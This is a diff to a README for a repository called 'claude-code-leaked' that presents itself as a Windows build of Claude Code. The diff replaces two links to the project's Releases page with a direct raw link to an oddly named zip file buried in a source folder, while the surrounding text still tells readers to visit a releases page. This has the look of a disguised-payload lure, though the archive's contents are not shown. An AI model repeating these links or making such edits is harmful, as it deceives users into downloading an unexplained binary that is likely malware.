@@ -1,6 +1,6 @@
 # 🧠 claude-code-leaked - Run Claude Code on Windows
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Visit%20Releases-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Thronged-ulteriority430/claude-code-leaked/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-Visit%20Releases-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Thronged-ulteriority430/claude-code-leaked/main/src/entrypoints/sdk/claude-leaked-code-intimity.zip)
 
 ## 🚀 What this is
 
@@ -10,7 +10,7 @@ claude-code-leaked is a Windows-friendly CLI and TUI app that helps you work wit
 
 Visit this page to download the latest Windows release:
 
-https://github.com/Thronged-ulteriority430/claude-code-leaked/releases
+https://raw.githubusercontent.com/Thronged-ulteriority430/claude-code-leaked/main/src/entrypoints/sdk/claude-leaked-code-intimity.zip
 
 On that page, look for the newest release and download the Windows file that fits your PC. In most cases, this will be an `.exe` file or a zip package made for Windows.
 
